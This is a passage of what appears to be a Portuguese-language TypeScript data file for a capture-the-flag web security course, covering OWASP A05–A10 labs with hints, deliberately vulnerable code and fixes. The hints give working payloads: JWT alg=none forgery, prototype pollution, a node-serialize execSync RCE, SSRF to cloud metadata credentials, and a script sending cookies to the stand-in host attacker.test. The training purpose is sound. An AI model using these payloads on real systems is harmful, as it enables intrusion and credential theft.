        'Configuração insegura: recurso de diagnóstico habilitado fora de ambiente de desenvolvimento, sem autenticação, retornando segredos e detalhes internos (process.env inteiro).',
      impact:
        'Vazamento de segredos (chaves de assinatura, strings de conexão, endpoints internos) que viram a chave-mestra para movimentação lateral. No CVE-2024-7569 (Ivanti ITSM, CVSS 9.8) um endpoint de debug entregou o segredo OIDC, permitindo forjar tokens de admin — exatamente o encadeamento A05→A07 que você faz aqui. Misconfiguration raramente é "a" falha: é o acelerador de todas as outras.',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `// FALHA: endpoint de debug sem gate de ambiente nem auth
router.get('/debug/env', (req, res) => {
  res.json(process.env); // expoe TODOS os segredos
});`,
      secureLanguage: 'typescript',
      secureCode: `// CORRECAO: desabilitar em producao + auth + nunca ecoar env
if (process.env.NODE_ENV !== 'production') {
  router.get('/debug/env', requireAdmin, (req, res) => {
    res.json({ nodeEnv: process.env.NODE_ENV }); // whitelist minima
  });
}`,
      remediation: [
        'Remova/bloqueie endpoints de debug e actuators em produção (feature flag por ambiente).',
        'Nunca ecoe process.env, stack traces ou versões em respostas.',
        'Hardening: defina NODE_ENV=production, headers de segurança, desabilite x-powered-by.',
        'Automatize o baseline de configuração (IaC + testes de configuração/CSPM).',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A05:2021 Security Misconfiguration', url: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/' },
      { label: 'CWE-215: Insertion of Sensitive Information Into Debugging Code', url: 'https://cwe.mitre.org/data/definitions/215.html' },
      { label: 'Caso real (2024): CVE-2024-7569 — debug do Ivanti ITSM vaza OIDC client secret (CVSS 9.8)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-7569' },
    ],
    flag: 'CYBER{a05_debug_endpoints_do_not_belong_in_prod}',
  },

  // ───────────────────────────── A06 ─────────────────────────────
  {
    id: 'a06-vuln-components',
    owaspId: 'A06',
    owaspTitle: 'Vulnerable and Outdated Components',
    killChain: { step: 7, uses: 'Privilégio administrativo (do A07/A04) para alcançar o endpoint de configuração interno.', provides: 'Prototype pollution via dependência vulnerável — a base de escalonamento que, com gadgets, chega a RCE.' },
    title: 'Componente desatualizado com CVE conhecido',
    difficulty: 'Intermediario',
    points: 150,
    cwe: 'CWE-1104',
    tags: ['SCA', 'CVE', 'Dependencies', 'Supply Chain'],
    tools: ['proto'],
    primer:
      'O QUE É COMPONENTE VULNERÁVEL/DESATUALIZADO (A06)? A falha não está no SEU código, e sim numa dependência (direta ou transitiva) com um CVE conhecido. Você é responsável pela segurança de TODA a árvore de dependências que importa. Exemplo deste lab: uma função de merge recursivo de uma lib antiga que não bloqueia chaves especiais (__proto__, constructor, prototype), permitindo PROTOTYPE POLLUTION — poluir Object.prototype e influenciar objetos do processo inteiro (privesc, DoS e, com gadgets, RCE).\n\nCOMO EXPLORAR: descubra a biblioteca e a versão (ex.: um endpoint /version), pesquise o CVE dessa versão e envie o payload que ela aceita — aqui, {"__proto__":{"isAdmin":true}} num merge.\n\nReferências: OWASP A06:2021 · CWE-1104 (Unmaintained Components) · PortSwigger Prototype Pollution. Links na aba Referências.',
    objective:
      'O endpoint de configuração usa um "merge" recursivo de uma biblioteca antiga, vulnerável a prototype pollution. Descubra a versão, pesquise o CVE e envie o payload que injeta uma propriedade no Object.prototype. Sucesso = forçar isAdmin=true globalmente e a resposta passar a incluir o recurso administrativo (masterKey).',
    context:
      'Passo 7 — abusando do que a Nexus importou sem auditar. O endpoint /api/a06/merge-config faz merge recursivo com lodash 4.17.4 (CVE-2019-10744), que não protege chaves especiais como __proto__. Você pesquisa a versão, encontra o CVE e polui o protótipo. É o retrato do A06: a falha não está no SEU código, e sim numa dependência esquecida — e o mesmíssimo padrão __proto__ reapareceu em 2025 no CVE-2025-55164 (content-security-policy-parser, CVSS 9.1).',
    baseEndpoint: 'POST /api/a06/merge-config',
    exampleRequests: [
      { method: 'GET', path: '/api/a06/version', note: 'Baseline: revela a dependência e a versão em uso. Pesquise o CVE dessa versão exata.' },
      { method: 'POST', path: '/api/a06/merge-config', body: '{"theme":"light"}', note: 'Baseline: um merge normal de config (nada acontece). Explore: injete uma chave especial para poluir o protótipo.' },
    ],
    hints: [
      'Consulte GET /api/a06/version e pesquise o CVE da versão (lodash 4.17.4 → CVE-2019-10744).',
      'Prototype pollution: no corpo, injete {"__proto__":{"isAdmin":true}} (constructor.prototype também funciona).',
      'Depois do merge poluído, TODO objeto passa a ter isAdmin=true — e a resposta então inclui adminFeatures.masterKey.',
    ],
    writeup: {
      rootCause:
        'Uso de componente desatualizado/inseguro cuja rotina de merge recursivo não protege chaves especiais (__proto__, constructor, prototype), permitindo poluir Object.prototype — e, a partir daí, influenciar o comportamento de todo o processo.',
      impact:
        'Prototype pollution eleva privilégio, causa DoS e, combinada com "gadgets" presentes em outras libs, chega a RCE. O CVE-2019-10744 (lodash, CVSS 9.1) atingiu milhões de projetos; em 2025 o CVE-2025-55164 mostrou que o mesmo __proto__ continua escapando em parsers novos. A lição do A06: você é responsável pela segurança de TODA a sua árvore de dependências, não só do código que escreve.',
      vulnerableLanguage: 'javascript',
      vulnerableCode: `// lib desatualizada: merge recursivo sem bloquear __proto__
function merge(target, src) {
  for (const k in src) {
    if (typeof src[k] === 'object') merge(target[k] ||= {}, src[k]);
    else target[k] = src[k];   // polui Object.prototype via __proto__
  }
  return target;
}`,
      secureLanguage: 'javascript',
      secureCode: `function merge(target, src) {
  for (const k of Object.keys(src)) {
    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
    if (src[k] && typeof src[k] === 'object')
      merge(target[k] ??= {}, src[k]);
    else target[k] = src[k];
  }
  return target;
}
// melhor ainda: atualizar a dependencia e usar Object.create(null)/Map`,
      remediation: [
        'Mantenha um inventário (SBOM) e rode SCA (npm audit, OWASP Dependency-Check, Snyk) no CI.',
        'Atualize dependências regularmente; fixe versões e use lockfile + Dependabot/Renovate.',
        'Prefira estruturas sem protótipo (Object.create(null), Map) para dados externos.',
        'Monitore advisories (GitHub Security, NVD) para os componentes que você usa; rode Node com --disable-proto quando possível.',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A06:2021 Vulnerable and Outdated Components', url: 'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/' },
      { label: 'CWE-1104: Use of Unmaintained Third Party Components', url: 'https://cwe.mitre.org/data/definitions/1104.html' },
      { label: 'CVE-2019-10744 — lodash prototype pollution, técnica deste lab (CVSS 9.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2019-10744' },
      { label: 'Caso real (2025): CVE-2025-55164 — prototype pollution via __proto__ no content-security-policy-parser, corrigido na 0.6.0 (CVSS 9.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-55164' },
      { label: 'Prototype Pollution (PortSwigger Web Security Academy)', url: 'https://portswigger.net/web-security/prototype-pollution' },
    ],
    flag: 'CYBER{a06_outdated_dependency_prototype_pollution}',
  },

  // ───────────────────────────── A07 ─────────────────────────────
  {
    id: 'a07-jwt-none',
    owaspId: 'A07',
    owaspTitle: 'Identification and Authentication Failures',
    killChain: { step: 5, uses: 'O JWT_SECRET vazado no A05 — ele permite assinar um token admin VÁLIDO (HS256), não só o truque do alg=none.', provides: 'Acesso administrativo pleno à API (deployKey) — a chave para os passos de pivot e RCE.' },
    title: 'JWT com algoritmo "none" (ou segredo vazado)',
    difficulty: 'Avancado',
    points: 200,
    cwe: 'CWE-347',
    tags: ['JWT', 'alg:none', 'Auth', 'Privilege Escalation'],
    tools: ['jwt'],
    primer:
      'O QUE É FALHA DE IDENTIFICAÇÃO/AUTENTICAÇÃO (A07)? É quando o mecanismo que comprova QUEM você é pode ser contornado: senhas fracas, ausência de MFA, sessões mal geridas e — o caso deste lab — verificação de JWT quebrada. Um JWT é header.payload.signature; a segurança depende de VERIFICAR a assinatura fixando o algoritmo esperado. Erros fatais: aceitar "alg":"none" (sem assinatura), aceitar algoritmo escolhido pelo atacante (confusion RS256→HS256) ou usar um segredo fraco/vazado (aí o atacante assina um token válido).\n\nCOMO EXPLORAR: (1) alg=none — monte header {"alg":"none"}, payload com role=admin e assinatura vazia (header.payload.); (2) se o segredo HMAC vazar (ex.: no A05), assine um HS256 válido com role=admin usando esse segredo.\n\nReferências: OWASP A07:2021 · CWE-347 (Improper Signature Verification) · OWASP JWT Cheat Sheet. Links na aba Referências.',
    objective:
      'O backend valida JWTs sem fixar o algoritmo e aceita "alg":"none" (sem assinatura). Forje um token com role=admin por DOIS caminhos — alg=none e, usando o JWT_SECRET do A05, uma assinatura HS256 válida — e acesse /api/a07/admin. Sucesso = o painel admin responder com o segredo de deploy.',
    context:
      'Passo 5 — virando admin de verdade. Ao logar como "dev_junior" você recebe um JWT HS256 com role=user; o /admin te barra com 403. Aqui mora o A07: a verificação não fixa o algoritmo esperado. Caminho fácil: alg=none. Caminho realista e devastador: como você pegou o JWT_SECRET no /debug/env do A05, você assina um token HS256 PERFEITAMENTE VÁLIDO com role=admin — foi o enredo do CVE-2026-44699 (LibJWT, CVSS 9.1), em que a lib aceitava verificar HS256 com chave indevida e derrubava a autenticação inteira.',
    baseEndpoint: 'GET /api/a07/admin',
    exampleRequests: [
      { method: 'POST', path: '/api/a07/login', body: '{"username":"dev_junior","password":"qwerty"}', note: 'Baseline: autentique-se e receba um JWT HS256 com role=user (capturado automaticamente).' },
      { method: 'GET', path: '/api/a07/admin', auth: true, note: 'Baseline: usa seu JWT capturado → 403 (role=user). Explore: forje o token para virar admin.' },
    ],
    hints: [
      'Com seu token (role=user) o /admin retorna 403. Você precisa de role=admin DENTRO do token — e o servidor não vai reclamar da assinatura.',
      'Caminho 1 (alg=none): header = {"alg":"none","typ":"JWT"}, payload com "role":"admin", assinatura vazia → header.payload. (com o ponto final). Funciona em qualquer caixa: none/None/NONE.',
      '[KILL CHAIN] Caminho 2 (segredo vazado): com o JWT_SECRET do A05, assine um HS256 válido com role=admin usando esse segredo (ataque de weak/known secret) — indistinguível de um token legítimo.',
    ],
    writeup: {
      rootCause:
        'A verificação de JWT não fixa o algoritmo esperado e aceita "none" (sem assinatura). Pior: se o segredo HMAC vaza por outra falha, o atacante assina um token válido. Em ambos os casos o servidor passa a confiar em um token totalmente controlado pelo atacante.',
      impact:
        'Qualquer um forja tokens com claims arbitrárias (role=admin, sub=qualquer) → escalonamento de privilégio e account takeover. O CVE-2026-44699 (LibJWT, CVSS 9.1) e o CVE-2024-54150 (cjwt) são variações recentes de "a lib não fixa o algoritmo": confusão RS256→HS256 ou HMAC com chave nula derrubam a autenticação inteira. É a ligação direta com o A02 (confiar em dado não verificado) e com o A05 (que vazou o segredo).',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `// FALHA: decodifica sem exigir algoritmo/assinatura
function verify(token) {
  const [h, p] = token.split('.');
  const header = JSON.parse(b64urlDecode(h));
  if (header.alg === 'none') return JSON.parse(b64urlDecode(p)); // aceita!
  // ... verificacao HS256 ...
}`,
      secureLanguage: 'typescript',
      secureCode: `import jwt from 'jsonwebtoken';
// CORRECAO: fixe o algoritmo esperado; nunca aceite 'none'
const payload = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
// para chaves assimetricas: algorithms:['RS256'] e valide iss/aud/exp`,
      remediation: [
        'Sempre passe a allowlist de algoritmos na verificação (algorithms: [...]).',
        'Rejeite "none" e algoritmos fracos; valide exp, iss, aud.',
        'Use segredos fortes (HS256) ou chaves assimétricas (RS256/EdDSA) com rotação — e nunca deixe o segredo vazar por um /debug.',
        'Considere tokens de sessão opacos server-side quando não precisar de stateless.',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A07:2021 Identification and Authentication Failures', url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/' },
      { label: 'OWASP JWT Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html' },
      { label: 'CWE-347: Improper Verification of Cryptographic Signature', url: 'https://cwe.mitre.org/data/definitions/347.html' },
      { label: 'Caso real (2026): CVE-2026-44699 — LibJWT verifica HS256 com chave nula → bypass de autenticação (CVSS 9.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-44699' },
      { label: 'Caso real (2024): CVE-2024-54150 — JWT algorithm confusion (RS256→HS256) na cjwt (CVSS 9.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-54150' },
    ],
    flag: 'CYBER{a07_jwt_alg_none_pin_your_algorithms}',
  },

  // ───────────────────────────── A08 ─────────────────────────────
  {
    id: 'a08-insecure-deser',
    owaspId: 'A08',
    owaspTitle: 'Software and Data Integrity Failures',
    killChain: { step: 9, uses: 'A SecretAccessKey da AWS roubada no A10 — ela é exigida no header X-Cloud-Key para o endpoint aceitar o import.', provides: 'Remote Code Execution no servidor da Nexus — o comprometimento total que antecede a limpeza de rastros.' },
    title: 'Desserialização insegura (node-serialize RCE)',
    difficulty: 'Avancado',
    points: 220,
    cwe: 'CWE-502',
    tags: ['Insecure Deserialization', 'RCE', 'node-serialize', 'CVE-2017-5941'],
    tools: ['node-serialize'],
    primer:
      'O QUE É FALHA DE INTEGRIDADE DE SOFTWARE/DADOS (A08)? É confiar em código ou dados sem verificar sua ORIGEM e INTEGRIDADE: updates sem assinatura, pipelines CI/CD inseguras e — o caso deste lab — DESSERIALIZAÇÃO INSEGURA. Desserializar é reconstruir um objeto a partir de bytes; bibliotecas "ricas" reconstroem (e às vezes EXECUTAM) tipos/funções embutidos no dado. Se o dado vem do atacante, isso vira RCE antes de qualquer validação. O mesmo risco existe em pickle (Python), ObjectInputStream (Java), BinaryFormatter (.NET) e, aqui, node-serialize (Node), que executa funções marcadas com _$$ND_FUNC$$_.\n\nCOMO EXPLORAR: injete uma função auto-invocada (IIFE) no formato do desserializador — em node-serialize, um valor _$$ND_FUNC$$_function(){...}() roda durante o unserialize.\n\nReferências: OWASP A08:2021 · CWE-502 (Deserialization of Untrusted Data) · OWASP Deserialization Cheat Sheet. Links na aba Referências.',
    objective:
      'O endpoint de importação de perfil desserializa dados não confiáveis com node-serialize.unserialize(), que EXECUTA funções marcadas com _$$ND_FUNC$$_. Autentique o deploy com a chave roubada no A10 e injete um payload IIFE que dispara execução de código. Sucesso = a resposta trazer a saída do comando executado no servidor.',
    context:
      'Passo 9 — do acesso à nuvem ao RCE. O serviço de perfis da Nexus usa node-serialize@0.0.4 (CVE-2017-5941). Mas o import de perfil é um fluxo "privilegiado": ele só roda se você provar que já comprometeu a infra — por isso exige o header X-Cloud-Key com a SecretAccessKey que você roubou via SSRF no A10. Um IIFE marcado com _$$ND_FUNC$$_ executa durante o unserialize. É a mesma classe do CVE-2025-53770 (SharePoint "ToolShell", RCE em massa) e do CVE-2026-25769 (Wazuh): desserializar dado não confiável = executar código do atacante.',
    baseEndpoint: 'POST /api/a08/import-profile',
    exampleRequests: [
      { method: 'GET', path: '/api/a08/profile', note: 'Baseline: mostra o desserializador em uso e o formato do objeto de perfil.' },
      { method: 'POST', path: '/api/a08/import-profile', body: '{"data":"{\\"name\\":\\"ana\\",\\"role\\":\\"user\\"}"}', note: 'Baseline: import benigno. Sem o header X-Cloud-Key ele retorna 401. Explore: adicione o header (chave do A10) e injete um IIFE serializado.' },
    ],
    hints: [
      '[KILL CHAIN] O deploy exige a SecretAccessKey roubada no A10. Adicione o header "X-Cloud-Key: <SecretAccessKey do A10>" — sem ela, 401.',
      'node-serialize executa funções marcadas com _$$ND_FUNC$$_ durante unserialize(); um IIFE (com "()" no fim) dispara na desserialização, antes de qualquer validação.',
      String.raw`Em "data", envie: {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}`,
    ],
    writeup: {
      rootCause:
        'Dados não confiáveis são desserializados com node-serialize.unserialize(), que reconstrói e EXECUTA funções (marcador _$$ND_FUNC$$_). Um IIFE no payload roda código no servidor durante a desserialização — RCE (CVE-2017-5941). É uma falha de INTEGRIDADE: o processo confia na origem e na estrutura do dado serializado sem verificar nada.',
      impact:
        'Remote Code Execution no servidor: execução de comandos, leitura de segredos, pivot para a rede interna. O mesmo padrão afeta pickle (Python), ObjectInputStream (Java) e BinaryFormatter (.NET). Em 2025, o CVE-2025-53770 (SharePoint "ToolShell", CVSS 9.8) foi explorado em massa como zero-day via desserialização de ViewState; em 2026, o CVE-2026-25769 (Wazuh, CVSS 9.1) mostrou o mesmo em um SIEM. Integridade de dados entrou no Top 10 de 2021 para dar nome a esse risco.',
      vulnerableLanguage: 'javascript',
      vulnerableCode: `const serialize = require('node-serialize'); // 0.0.4 — vulneravel
app.post('/import-profile', (req, res) => {
  // FALHA: desserializa dado controlado pelo atacante.
  // _$$ND_FUNC$$_function(){...}() executa durante o unserialize -> RCE
  const profile = serialize.unserialize(req.body.data);
  res.json({ imported: true, profile });
});`,
      secureLanguage: 'javascript',
      secureCode: `// CORRECAO: nunca desserialize dados nao confiaveis em formatos que
// instanciam objetos/funcoes. Use JSON puro + validacao de schema.
import { z } from 'zod';
const Profile = z.object({ name: z.string().max(80), role: z.enum(['user','admin']) });
app.post('/import-profile', (req, res) => {
  let raw;
  try { raw = JSON.parse(req.body.data); } catch { return res.status(400).json({ error: 'json invalido' }); }
  const parsed = Profile.safeParse(raw);
  if (!parsed.success) return res.status(400).json({ error: 'perfil invalido' });
  res.json({ imported: true, profile: parsed.data });
});`,
      remediation: [
        'Nunca desserialize dados não confiáveis com bibliotecas que reconstroem objetos/funções (node-serialize, pickle, BinaryFormatter, ObjectInputStream).',
        'Use formatos de dados puros (JSON) + validação de schema (Zod/Ajv) e tipos explícitos.',
        'Se precisar de integridade/origem, assine o payload (HMAC/assinatura) e verifique antes de processar.',
        'Mantenha dependências atualizadas (SCA) e remova pacotes abandonados como node-serialize.',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A08:2021 Software and Data Integrity Failures', url: 'https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/' },
      { label: 'CWE-502: Deserialization of Untrusted Data', url: 'https://cwe.mitre.org/data/definitions/502.html' },
      { label: 'CVE-2017-5941 — node-serialize RCE (a técnica exata deste lab)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2017-5941' },
      { label: 'Caso real (2026): CVE-2026-25769 — RCE por desserialização insegura no Wazuh Cluster (CVSS 9.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-25769' },
      { label: 'Caso real (2025, zero-day explorado em massa): CVE-2025-53770 — SharePoint "ToolShell", RCE por desserialização de ViewState (CVSS 9.8)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-53770' },
      { label: 'OWASP Deserialization Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html' },
    ],
    flag: 'CYBER{a08_insecure_deserialization_rce_node_serialize}',
  },

  // ───────────────────────────── A09 ─────────────────────────────
  {
    id: 'a09-log-injection',
    owaspId: 'A09',
    owaspTitle: 'Security Logging and Monitoring Failures',
    killChain: { step: 10, uses: 'Tudo o que você fez até aqui — agora é hora de apagar os rastros no subsistema de auditoria.', provides: 'Cobertura final: uma trilha de auditoria forjada que engana o SOC e, ao ser aberta no dashboard, sequestra a sessão do próprio analista — fechando a intrusão.' },
    title: 'Log injection / forjando trilha de auditoria',
    difficulty: 'Intermediario',
    points: 150,
    cwe: 'CWE-117',
    tags: ['Logging', 'Log Injection', 'CRLF', 'Monitoring', 'Stored XSS'],
    tools: ['crlf'],
    primer:
      'O QUE É FALHA DE LOGGING E MONITORAMENTO (A09)? Duas faces: (1) não registrar/alertar eventos de segurança suficientes (ataques passam despercebidos); (2) registrar e EXIBIR entrada não confiável SEM neutralizar — o caso deste lab, em DUAS camadas. Camada 1: LOG INJECTION (CRLF) — se a entrada do usuário é concatenada no log sem escapar quebras de linha (\\r\\n), o atacante escreve LINHAS inteiras de log, forjando eventos. Camada 2 (a parte que eleva o risco): o mesmo log cru costuma ser renderizado num painel/dashboard para o analista ler — se esse painel também não neutraliza HTML, o que era "só" uma linha de log forjada vira um <script> executando na SESSÃO DO ANALISTA (Stored XSS contra quem está monitorando). É assim que log injection deixa de ser cosmético e vira comprometimento real: o atacante não engana só o texto, ele ataca a FERRAMENTA de monitoramento.\n\nCOMO EXPLORAR: (1) injete um \\n no campo logado seguido de uma linha no formato que o parser de auditoria reconhece como evento legítimo; (2) na MESMA entrada, inclua um <script> — quando o dashboard do SOC renderizar o log sem escapar, o script "roda" na sessão de quem está lendo.\n\nReferências: OWASP A09:2021 · CWE-117 (Improper Output Neutralization for Logs) · CWE-79 (XSS) · OWASP Logging e XSS Cheat Sheets. Links na aba Referências.',
    objective:
      'O logger grava a entrada do usuário sem neutralizar quebras de linha, E o dashboard do SOC renderiza esse log como HTML sem escapar nada. Uma única falha, duas camadas quebradas. Primeiro, injete um \\n no username para forjar uma linha "AUDIT event=admin_login_success" (prova de log injection). Depois, na MESMA técnica, injete também um <script> e abra o dashboard: as DUAS coisas juntas — evento forjado + script — são o que libera o clearance de verdade. Forjar sozinho não é suficiente: é preciso encadear log injection com a falha de encoding na visualização.',
    context:
      'Passo 10 — cobrindo os rastros. Depois do RCE, falta enganar quem vai investigar. O /api/a09/login da Nexus grava "AUTH user=<entrada>" no log concatenando a entrada crua — sem sanitização de CRLF, você forja uma linha de auditoria inteira. Mas o verdadeiro prêmio está no /api/a09/dashboard: o painel que o analista do SOC abre para ler essa trilha renderiza o log como HTML, também sem escapar nada. A mesma causa-raiz (confiar em entrada não confiável) agora compromete a FERRAMENTA de monitoramento — seu <script> injetado roda na sessão de quem deveria estar te caçando. É a cara do A09 levado ao extremo, prima do CVE-2021-44228 "Log4Shell" (texto logado virando execução) e de incidentes reais onde o próprio dashboard de segurança foi o vetor.',
    baseEndpoint: 'POST /api/a09/login · GET /api/a09/dashboard',
    exampleRequests: [
      { method: 'POST', path: '/api/a09/login', body: '{"username":"ana.paula"}', note: 'Baseline: gera uma linha de log normal (AUTH user=ana.paula).' },
      { method: 'GET', path: '/api/a09/logs', note: 'Veja como o log é estruturado (uma entrada por linha). Explore: injete uma quebra de linha no username para forjar uma segunda linha.' },
      { method: 'GET', path: '/api/a09/dashboard', note: 'Baseline: o painel do SOC renderiza o mesmo log como HTML. Observe que nada é escapado — qualquer tag no log vira HTML de verdade aqui.' },
    ],
    hints: [
      'Passo 1 (log injection): a entrada é concatenada no log sem escapar \\n. Uma quebra de linha no username cria uma LINHA de log inteiramente controlada por você: x\\nAUDIT event=admin_login_success user=ceo.',
      'Passo 2 (a parte que FALTAVA): GET /api/a09/dashboard mostra que o log vira HTML sem nenhum escaping. Isso significa que uma linha logada com um <script> vai parar, intacta, dentro do HTML do painel.',
      'Combine os dois na MESMA entrada de username: x\\nAUDIT event=admin_login_success user=ceo\\n<script>fetch(\'https://attacker.test/exfil?c=\'+document.cookie)</script> — depois chame POST /api/a09/login com isso e então GET /api/a09/dashboard. Só com o evento forjado E o script presentes juntos o painel reporta a sessão do analista sequestrada (clearanceToken).',
    ],
    writeup: {
      rootCause:
        'Entrada não confiável é escrita no log sem neutralizar caracteres de controle (CRLF) — o atacante forja linhas inteiras. Isso já seria A09 sozinho, mas a falha se agrava porque o PAINEL que exibe esse log para o analista também não neutraliza a saída (falta de encoding ao renderizar como HTML, CWE-79). O resultado é uma cadeia: log injection vira Stored XSS contra a própria ferramenta de monitoramento — quem deveria investigar o ataque é quem acaba comprometido.',
      impact:
        'Logs não confiáveis atrapalham resposta a incidentes e forense; quando o pipeline de visualização também não escapa a saída, o impacto deixa de ser "só" trilha corrompida e vira execução de código na sessão do analista — roubo de cookies/tokens de quem monitora, movimentação lateral dentro da própria ferramenta de segurança. O CVE-2021-44228 "Log4Shell" (CVSS 10.0) já mostrou que entrada logada sem tratamento vira RCE; aqui a mesma lição se repete na camada de apresentação: se o atacante controla o que entra no seu log E o seu dashboard não escapa a saída, ele controla quem investiga.',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `router.post('/login', (req, res) => {
  // FALHA 1: concatena entrada crua no log (CRLF injection)
  log += 'AUTH user=' + req.body.username + '\\n';
  res.json({ ok: true });
});

router.get('/dashboard', (req, res) => {
  // FALHA 2: renderiza o log como HTML SEM escapar nada
  const html = log.split('\\n').map(l => \`<div>\${l}</div>\`).join('');
  res.send(html); // qualquer <script> no log EXECUTA na sessao de quem abrir isso
});`,
      secureLanguage: 'typescript',
      secureCode: `function sanitizeForLog(s) {
  return String(s).replace(/[\\r\\n\\t]/g, ' ').slice(0, 256);
}
function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
}
router.post('/login', (req, res) => {
  logger.info({ event: 'auth_attempt', user: sanitizeForLog(req.body.username) });
  // logging estruturado (JSON) separa campos de valores — impede CRLF injection
  res.json({ ok: true });
});
router.get('/dashboard', (req, res) => {
  const html = log.split('\\n').map(l => \`<div>\${escapeHtml(l)}</div>\`).join('');
  res.send(html); // escapar na SAIDA, nao so sanitizar na entrada
});`,
      remediation: [
        'Sanitize/escape CRLF e caracteres de controle antes de logar entrada do usuário.',
        'Use logging estruturado (JSON) — campos separados impedem forja de linhas.',
        'Escape SEMPRE a saída ao renderizar logs em qualquer UI/dashboard (HTML entity encoding) — sanitizar só a entrada não basta se a saída não for tratada.',
        'Centralize logs (SIEM), com alertas para eventos críticos (logins admin, falhas repetidas) e trate o próprio painel de monitoramento como superfície de ataque.',
        'Garanta logging suficiente de eventos de segurança + retenção + integridade (append-only).',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A09:2021 Security Logging and Monitoring Failures', url: 'https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/' },
      { label: 'OWASP Logging Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html' },
      { label: 'OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
      { label: 'CWE-117: Improper Output Neutralization for Logs', url: 'https://cwe.mitre.org/data/definitions/117.html' },
      { label: 'CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)', url: 'https://cwe.mitre.org/data/definitions/79.html' },
      { label: 'Caso real: CVE-2021-44228 "Log4Shell" — input logado vira RCE (CVSS 10.0)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
    ],
    flag: 'CYBER{a09_never_trust_unsanitized_log_input}',
  },

  // ───────────────────────────── A10 ─────────────────────────────
  {
    id: 'a10-ssrf',
    owaspId: 'A10',
    owaspTitle: 'Server-Side Request Forgery (SSRF)',
    killChain: { step: 8, uses: 'O host de metadados (169.254.169.254) vazado pelo /debug/env do A05.', provides: 'Credenciais temporárias da AWS (SecretAccessKey) — o X-Cloud-Key que o A08 exige para liberar o RCE.' },
    title: 'SSRF para metadados internos',
    difficulty: 'Avancado',
    points: 200,
    cwe: 'CWE-918',
    tags: ['SSRF', 'Cloud Metadata', 'Internal'],
    tools: ['url'],
    primer:
      'O QUE É SSRF (Server-Side Request Forgery, A10)? É quando a aplicação faz uma requisição de rede para uma URL que VOCÊ controla, sem validar o destino. Como quem dispara é o SERVIDOR, você alcança o que ele alcança e você não: loopback (127.0.0.1), redes privadas (10/172.16/192.168) e, o prêmio em nuvem, o serviço de METADADOS em 169.254.169.254, que entrega credenciais temporárias de IAM (foi o vetor do caso Capital One). Validar só o hostname não basta — é preciso resolver o DNS e checar o IP final (cuidado com DNS rebinding e redirects).\n\nCOMO EXPLORAR: aponte o parâmetro de URL para alvos internos; na AWS, siga o IMDS em 2 passos — liste a role em .../iam/security-credentials/ e depois busque .../iam/security-credentials/<role> para obter a SecretAccessKey.\n\nReferências: OWASP A10:2021 · CWE-918 · OWASP SSRF Prevention Cheat Sheet. Links na aba Referências.',
    objective:
      'O endpoint de "preview de URL" busca qualquer URL do lado do servidor, sem validar destino. Use-o para alcançar a rede interna e seguir o fluxo IMDS da AWS em 2 passos (listar a role → obter as credenciais da role). Sucesso = capturar a SecretAccessKey da conta de nuvem — que você vai gastar no A08.',
    context:
      'Passo 8 — pivot para a nuvem. O /api/a10/fetch-url da Nexus faz a requisição a partir do SERVIDOR (que enxerga a rede interna que você não enxerga) e não valida o destino. No A05 você já anotou o host de metadados 169.254.169.254; agora pede para o servidor buscá-lo e segue o fluxo IMDS para roubar credenciais temporárias de IAM. Foi assim no incidente da Capital One e é a cara dos CVE-2026-47938 (Adobe Campaign Classic, SSRF→code exec, CVSS 10.0) e CVE-2026-58508 (Gitea, SSRF via DNS rebinding).',
    baseEndpoint: 'GET /api/a10/fetch-url?url=',
    exampleRequests: [
      { method: 'GET', path: '/api/a10/fetch-url?url=https://status.cybershield.local/health', note: 'Baseline: uma URL externa permitida (healthcheck). Explore: aponte o servidor para alvos internos/link-local.' },
    ],
    hints: [
      'SSRF: quem faz a requisição é o SERVIDOR. Teste alvos que só ele alcança: http://127.0.0.1:8080/, http://localhost:9200/_cat/indices.',
      'Metadados em nuvem ficam em 169.254.169.254 (o host que vazou no A05). Comece listando a role: http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'Fluxo IMDS (2 passos): a role listada é "ec2-app-role". Agora busque .../iam/security-credentials/ec2-app-role → vêm AccessKeyId e SecretAccessKey (esta é a flag e o X-Cloud-Key do A08).',
    ],
    writeup: {
      rootCause:
        'A aplicação faz requisições para URLs controladas pelo usuário sem validar destino. O servidor vira um proxy confuso: alcança recursos internos (metadata, serviços de rede privada) que o atacante não alcançaria diretamente.',
      impact:
